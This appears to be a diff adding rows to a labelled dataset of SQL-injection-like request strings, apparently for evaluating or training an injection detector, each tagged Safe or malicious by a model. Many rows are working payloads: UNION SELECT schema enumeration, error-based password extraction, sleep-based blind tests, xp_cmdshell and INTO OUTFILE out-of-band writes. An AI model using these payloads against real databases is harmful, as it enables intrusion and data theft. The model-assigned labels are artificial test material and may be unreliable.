+"/?var=except values(1,2)",MaliciousIntended-but-safe,ChatGPT5.2 thinking
+/?var=except selecting,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+email=x' or array[id] is not null--,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+email=x' or email~all(array[email]);analyze--,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+email=' and email not similar to id--,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+email=' or true; foo,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+email=' or false; foo,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+email='||true,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+email='ortrue,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+/?var=;INSERT INTO table (col) VALUES,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+/?var=;insertion_424242,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+"/?var=CREATE+FUNCTION+hello+(s+CHAR(20))+RETURNS+CHAR(50)+DETERMINISTIC+RETURN+CONCAT('Hello,+',s,'!');",Malicious-Unsafe,ChatGPT5.2 thinking
+/?test=;truncate[xx,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+"var=1234 AS ""foobar"" FROM tablevar2=whatever",MaliciousIntended-but-safe,ChatGPT5.2 thinking
+selectChar(,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+SELECTGROUP_CONCAT(,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+selectload_file(,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+`AS`edit_user_id`from,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+pay=`+REGEXP ,Safe,ChatGPT5.2 thinking
+`AS`OXTIMESTAMP`from,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+(load_file(,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+`AS`documentType`FROM,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+"6As""from",Safe,ChatGPT5.2 thinking
+",asidefrom",Safe,ChatGPT5.2 thinking
+a=/create,Safe,ChatGPT5.2 thinking
+a=/CREATETABLEPersons,Safe,ChatGPT5.2 thinking
+Delete(Trashcan),Safe,ChatGPT5.2 thinking
+5desc,Safe,ChatGPT5.2 thinking
+34-delete,Safe,ChatGPT5.2 thinking
+update,Safe,ChatGPT5.2 thinking
+/select-quote,Safe,ChatGPT5.2 thinking
+Update:After...,Safe,ChatGPT5.2 thinking
+"""desc""",Safe,ChatGPT5.2 thinking
+a=/load.php,Safe,ChatGPT5.2 thinking
+a=/update-assets,Safe,ChatGPT5.2 thinking
+blablablaliveupdatechart,Safe,ChatGPT5.2 thinking
+.select-gws-banana,Safe,ChatGPT5.2 thinking
+blablabla.Asevidencefromthefollowingblablabla,Safe,ChatGPT5.2 thinking
+"||(SELECT(DBMS_LDAP.INIT('169.1.1.1',19))FROM(DUAL))/investigate",MaliciousIntended-but-safe,ChatGPT5.2 thinking
+||(select(pg_sleep(15))where(true))||'/investigate,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+"UNIONALLSELECTNULL,NULL,CONCAT(CONCAT('qqkjq','mxTSrPILRz'),'qvxvq')--sqCV",MaliciousIntended-but-safe,ChatGPT5.2 thinking
+2020-03-01UNIONALLSELECTCONCAT,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+"x"";SELECTLOAD_FILE('",MaliciousIntended-but-safe,ChatGPT5.2 thinking
+"-1UNIONSELECTnull,123456,null,null,null,null--",MaliciousIntended-but-safe,ChatGPT5.2 thinking
+"(CONVERT(INT,(SELECTCHAR(113)+CHAR(118)+CHAR(112)+CHAR(113)+CHAR(113)+(SELECT(CASEWHEN(6557=6557",MaliciousIntended-but-safe,ChatGPT5.2 thinking
+")UNIONALLSELECTNULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--",MaliciousIntended-but-safe,ChatGPT5.2 thinking
+"1unionselect1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,CONCAT('vbulletin','rce',@@version)",MaliciousIntended-but-safe,ChatGPT5.2 thinking
+"(SELECT4440FROM(SELECTCOUNT(*),CONCAT(0x716b627a71,(SELECT(ELT(4440=4440,1))),0x7170716271,FLOOR",MaliciousIntended-but-safe,ChatGPT5.2 thinking
+"2759399466.1534185336-6863unionallselect1,1,1,1,1,1,1,1,1,CONCAT",MaliciousIntended-but-safe,ChatGPT5.2 thinking
+altera,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+"""ALTERA",Safe,ChatGPT5.2 thinking
+alter/,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+"""UNIONA",MaliciousIntended-but-safe,ChatGPT5.2 thinking
+UNIONA,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+union/,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+)asccFROM,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+)ASordersFROM,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+)AS`carrier_id`from,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+)ASRoleFROM,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+)ASvalFROM,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+)AS'Durchschnitt_Importzeit'FROM,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+)ascol_0_0_from,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+)AS`count`FROM,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+)ASschlagwoerterFROM,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+)asUserfrom,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+)AStFROM,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+)asExecuteTheseSQLCommandsFROM,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+!As'from,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+;Asnotfrom,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+)asday1FROM,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+var='*from=1or'9,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+var='*from=1id'9,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+var='=#',MaliciousIntended-but-safe,ChatGPT5.2 thinking
+var='?#=#,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+var='?#=--,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+var='orhomer9,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+var=^',Safe,ChatGPT5.2 thinking
+"var=""`*12344",MaliciousIntended-but-safe,ChatGPT5.2 thinking
+var=>foo##'.,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+from`db_miwf`.`sys_refindex`limit,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+"from(selectcount(*),concat((select(select(selectconcat(0x53,0x65,0x61,0x72,0x63,0x68,0x43,0x6F,0x6C,0x6C,0x65,0x63,0x74,0x6F,0x72)from`information_schema`.tableslimit",MaliciousIntended-but-safe,ChatGPT5.2 thinking
+from`information_schema`.tableslimit,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+ORderby,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+SELECT(CASE,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+pay=FROM+termine+GROUP+BY+tag1&sql_delimit,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+"SELECT6229FROM(SELECTCOUNT(*),CONCAT(0x717a786a71,(SELECT(CASE",MaliciousIntended-but-safe,ChatGPT5.2 thinking
+SELECTCHAR(113)+CHAR(122)+CHAR(120)+CHAR(106)+CHAR(113)+(SELECT(CASE,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+SELECTUPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(122)||CHR(120)||CHR(106)||CHR(113)||(SELECT(CASE,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+"SELECTCONCAT(0x717a786a71,(SELECT(CASE",MaliciousIntended-but-safe,ChatGPT5.2 thinking
+SELECT(CHR(113)||CHR(122)||CHR(120)||CHR(106)||CHR(113))||(SELECT(CASE,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+SELECTCHR(113)||CHR(122)||CHR(120)||CHR(106)||CHR(113)||(SELECT(CASE,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+SELECT'qzxjq'||(SELECT(CASE,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+executephp,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+"""from(selectcount(*),concat((select(select(SELECTconcat(user_name,0x7c,password)FROMecs_admin_userdesclimit""",MaliciousIntended-but-safe,ChatGPT5.2 thinking
+Execute(,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+"from+information_schema.tables+where+BINARY+LEFT(table_name,+1)+=+'nnn'+LIMIT",MaliciousIntended-but-safe,ChatGPT5.2 thinking
+from+information_schema.tables+where+table_schema=database()+and+table_name+REGEXP+0x6d656d6265727324+limit,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+"fromtype=vBForum:SocialGroupMessage&do=process&contenttypeid=5&categoryid[]=-99)+union+select+salt+from+user+where+userid=1+and+row(1,1)>(select+count(*),concat(+(select+user.salt)+,0x3a,floor(rand(0)*2))+x+from+(select+1+union+select+2+union+select+3)a+group+by+x+limit",MaliciousIntended-but-safe,ChatGPT5.2 thinking
+"from/**/(select/**/count(*),concat(floor(rand(0)*2),0x3a,(select/**/concat(user,0x3a,password)/**/from/**/pwn_base_admin/**/limit",MaliciousIntended-but-safe,ChatGPT5.2 thinking
+HAVING+1=,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+execute+elysi,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+"FROM(SELECT+COUNT(*),CONCAT(0x716a766b71,(SELECT+(ELT(3419=3419,1))),0x7171717071,FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.PLUGINS+GROUP+BY+x)a)&limit",MaliciousIntended-but-safe,ChatGPT5.2 thinking
+"FROM(SELECT+COUNT(*),CONCAT(0x716a766b71,(SELECT+(ELT(9184=9184,1))),0x7171717071,FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.PLUGINS+GROUP+BY+x)a)+AND+'%'='&limit",MaliciousIntended-but-safe,ChatGPT5.2 thinking
+from(select(sleep(20)))a)'&data[Job][limit,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+from(select(sleep(20)))a)+'&data[Job][limit,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+from(select(sleep(20)))a)--+&data[Job][limit,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+from(select(sleep(20)))a)&data[Job][limit,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+"FROM+ack_variable+WHERE+name=""cron_last"";&sql_delimit",MaliciousIntended-but-safe,ChatGPT5.2 thinking
+executenode_,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+executescald,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+executesystem,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+executeuser_,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+executeviews,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+executepatha,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+executeworkb,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+executepanel,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+pay=from+information_schema.tables+where+1=2+limit,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+pay=FROM+%60oxattribute%60+WHERE+CONVERT%28%60oxattribute%60.%60OXID%60+USING+utf8%29+%3D+%27n550a1cee455b9ce585343d75d112b77%27+LIMIT,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+"pay=FROM(select+count(*),concat((select+(select+concat(session_id))+FROM+jml_session+LIMIT",MaliciousIntended-but-safe,ChatGPT5.2 thinking
+pay=SELECT+dDJq+WHERE+9896=9896;SELECT+(CASE,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+pay=FROM+`we_tblErrorLog`+WHERE+`we_tblErrorLog`.`ID`+=+25251+LIMIT,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+"pay=FROM+`dates`+order+by+`uname`,+`date`,+`load`&dummy=`uname`&dummy=`datum`&dummy=`laden`&sql_delimit",MaliciousIntended-but-safe,ChatGPT5.2 thinking
+"pay=IF EXISTS (SELECT * FROM users WHERE username = 'root') BENCHMARK(1000000000,MD5(1))",MaliciousIntended-but-safe,ChatGPT5.2 thinking
+/?var=sdfsd'or 1 > 1,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+and'5'orig_var_datavarname=whatever,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+and7oranges,Safe,ChatGPT5.2 thinking
+ABS(,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+benchmark(,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+cast(,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+char(,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+chr(,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+COALESCE(,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+Compress(,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+concat(,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+concat_ws(,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+convert(,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+COS(,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+COUNT(,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+date(,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+pay=date]=(,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+pay=day.+(,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+pay=day&'(,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+pay=decode(,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+pay=default(,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+pay=ELT(,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+pay=encode=(,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+pay=ExtractValue(,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+pay=floor(,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+pay=FLOOR+(,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+pay=format(,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+pay=GROUP_CONCAT(,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+pay=hex(,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+pay=if+!(,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+pay=if+(,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+pay=if(,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+pay=if\(:,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+pay=IFNULL(,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+pay=in+'$(,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+pay=IN+(,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+pay=IN/**/(,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+pay=insert(,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+pay=left')?$(,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+pay=LEFT(,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+pay=length||!!$(,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+pay=length||(,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+pay=length?(,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+pay=length&&!!!$(,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+pay=length&&(,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+pay=LENGTH(,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+pay=ln+(,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+pay=ln)+(,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+pay=load_file(,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+pay=local(,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+pay=log(,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+pay=log&&(,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+pay=lower(,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+pay=MAKE_SET(,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+pay=MAX(,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+pay=md5(,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+pay=md5\(:,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+pay=MID(,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+pay=minute+(,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+pay=month=(,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+name_const(,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+now(,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+ord(,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+password?(,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+password/?(,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+Password>$(,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+pg_sleep(,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+pi(,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+pow(,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+quarter.(,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+rand(,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+replace(,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+round(,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+rtrim(,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+pay=sin(,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+SIN(,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+pay=sleep(,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+SLEEP(,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+pay=strcmp(,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+pay=substr(,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+SUBSTR(,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+pay=substring(,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+SUBSTRING(,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+pay=sysdate(,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+time(,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+pay=time(,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+pay=trim(,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+pay=Uncompress+(,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+pay=unhex(,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+pay=updatexml(,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+pay=UPPER(,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+pay=user+(,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+pay=user/?(,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+pay=user(,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+pay=values+(,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+pay=VALUES(,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+pay=version=(,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+pay=version(,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+pay=xmltype(,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+pay=year]=(,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+var=(((((())))))&var2=whatever,Safe,ChatGPT5.2 thinking
+var=-------------------&var2=whatever,Safe,ChatGPT5.2 thinking
+var=;;ddfoobar,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+/post?var=DROP sampletable;--,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+test='or1=1;?,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+test=OR1#,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+test=admin'--,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+test=DROP/*comment*/sampletable,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+test=DR/**/OP/*bypassdenylisting*/sampletable,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+test=SELECT/*avoid-spaces*/password/**/FROM/**/Members,Malicious-Unsafe,ChatGPT5.2 thinking
+"test=SELECT/*!323021/0,*/1FROMtablename",MaliciousIntended-but-safe,ChatGPT5.2 thinking
+test='or1=1#,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+test=‘or1=1---,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+test=‘or1=1/*,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+test=1='1'or---,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+test='/*!50000or*/1='1,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+test='/*!or*/1='1,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+test=0/**/union/*!50000select*/table_name`foo`/**/,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMe--KKF2QT4fwpMeJf36POk6yJV_adQssw-5c,Safe,ChatGPT5.2 thinking
+foo=bar,Safe,ChatGPT5.2 thinking
+/callback?token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMe--KKF2QT4fwpMeJf36POk6yJV_adQssw-5c,Safe,ChatGPT5.2 thinking
+/get/?fbclid=IwAR1dug0BYxe0ukhZ2vKrdQwLAxVFRJ--Q2Y7OBJE_0uId9-Eh-sJWLdVk2E,Safe,ChatGPT5.2 thinking
+/get/?gclid=j0KCQiA1NebBhDDARIsAANiDD3_RJeMv8zScF--mC1jf8fO8PDYJCxD9xdwT7iQ59QIIwL-86ncQtMaAh0lEALw_wcB,Safe,ChatGPT5.2 thinking
+var=\0xf00dsdfdsa,Safe,ChatGPT5.2 thinking
+"var=concat(0x223e3c62723e,version(),0x3c696d67207372633d22)",MaliciousIntended-but-safe,ChatGPT5.2 thinking
+var=select 0x616263,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+var=IHRlc3Q0xAcF,Safe,ChatGPT5.2 thinking
+var=9F86D081884C7D659A2FEAA0C55AD015A3BF4F1B2B0B822CD15D6C15B0F00A08,Safe,ChatGPT5.2 thinking
+var=foo....,Safe,ChatGPT5.2 thinking
+var=foo...,Safe,ChatGPT5.2 thinking
+pay=nvarchar,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+pay=xp_cmdshell,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+pay=varchar,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+pay=xp_dirtree,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+pay=xp_regread,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+pay=sp_password,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+pay=UTL_HTTP,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+pay=OPENROWSET,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+pay=sp_executesql,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+sp_executesql,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+/index.php?id=1+current_user::int,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+/?'msdasql',MaliciousIntended-but-safe,ChatGPT5.2 thinking
+var=EmptyValueintooutfile'\\\\jviw6aoxefbjk0luyi6oiwjv5unittests.coreruleset.org\\xct';--,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+var=/config.ini'intooutfile'\\\\il7vw9ew4e1iazbtohwn8v9uvl1hunitetests.coreruleset.org\\yxq';--,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+var=0.3480567293179807'UNIONALLselectNULL--,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+"var=config.ini"")UNIONALLselectNULL--",MaliciousIntended-but-safe,ChatGPT5.2 thinking
+var=CRS)UNIONALLselectNULL--,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+"var=CRS3"")UNIONALLselectNULL--",MaliciousIntended-but-safe,ChatGPT5.2 thinking
+/index.php?id=overlay(password placing '' from 1 for 0)::int,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+/index.php?id=overlay(password,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+placing,Safe,ChatGPT5.2 thinking
+'',Safe,ChatGPT5.2 thinking
+from 1 for 0)::int,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+"var=""` * 123",Safe,ChatGPT5.2 thinking
+"'',10",Safe,ChatGPT5.2 thinking
+"'','','','','','','','',13",Safe,ChatGPT5.2 thinking
+`>65,Safe,ChatGPT5.2 thinking
+pay='1001'='10,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+"""2562*23",Safe,ChatGPT5.2 thinking
+"pay="":[""00",Safe,ChatGPT5.2 thinking
+pay=`>6fbdec2,Safe,ChatGPT5.2 thinking
+"pay='][0]]),strtolower($b[$GLOBALS['",MaliciousIntended-but-safe,ChatGPT5.2 thinking
+"pay=',2,1",MaliciousIntended-but-safe,ChatGPT5.2 thinking
+`>9e7,Safe,ChatGPT5.2 thinking
+"pay="":""65",Safe,ChatGPT5.2 thinking
+pay='\2nq5,Safe,ChatGPT5.2 thinking
+pay=`<0)AND`,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+pay='0:0:6,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+""":60",Safe,ChatGPT5.2 thinking
+"pay="">%5-type_submit_reset_5",Safe,ChatGPT5.2 thinking
+""":35",Safe,ChatGPT5.2 thinking
+pay='3085'='30,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+""":""[0,\x22",Safe,ChatGPT5.2 thinking
+pay='16/17,Safe,ChatGPT5.2 thinking
+"Return results in CSV format."";}7b6",Safe,ChatGPT5.2 thinking
+/?id=9999+or+{if+length((/*!5000select+username/*!50000from*/user+where+id=1))>0},MaliciousIntended-but-safe,ChatGPT5.2 thinking
+/?id=9999+or+{if+length((/*+!5000select+username/*!50000from*/user+where+id=1))>0},MaliciousIntended-but-safe,ChatGPT5.2 thinking
+/get?test=9999+or+/*+optimizer+hint+*/+true,Malicious-Unsafe,ChatGPT5.2 thinking
+/get?test=9999+or+/*++optimizer+hint+*/+true,Malicious-Unsafe,ChatGPT5.2 thinking
+/?test=9999+or+{if+length((/*!5000select+username/*!comment*/,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+/?`bla`,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+/?'bla',MaliciousIntended-but-safe,ChatGPT5.2 thinking
+var=id'is not-id--,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+var=id'is notes,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+var=id'not like id--,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+var=id'not glob-id--,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+var=x'|email--,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+var=x'-email--,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+var=x'%2Bemail--,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+var=x'^email--,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+var=x'@email--,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+var=x'&email--,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+var=x'<email--,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+var=x'>email--,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+var=x'=email--,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+var=x'/email--,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+var=x'%email--,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+var=x'~email--,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+var=x' mod id--,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+var='sounds like rowid--,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+var='/**/*2--,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+var=foo'or'oof,Malicious-Unsafe,ChatGPT5.2 thinking
+var=foo\''or'oof,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+email=' is not?--,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+var=a'or'a,Malicious-Unsafe,ChatGPT5.2 thinking
+var=a'or?--,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+var=is this your parents' or yours?,Safe,ChatGPT5.2 thinking
+var=user'and id is not?--,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+var=it is your parents' and yours,Safe,ChatGPT5.2 thinking
+var=bob's or alice's,Safe,ChatGPT5.2 thinking
+var=mother or daughter,Safe,ChatGPT5.2 thinking
+var='oreo,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+var='fork,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+var=' for,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+var=''or,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+var='''or 1,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+var=\'lol' or '1,MaliciousIntended-but-safe,ChatGPT5.2 thinking
+' OR '1'='1,Malicious-Unsafe,ChatGPT5.2 thinking
+' OR '1'='1' --,Malicious-Unsafe,ChatGPT5.2 thinking
+' OR '1'='1' {,MaliciousIntended-but-safe,ChatGPT5.2 thinking
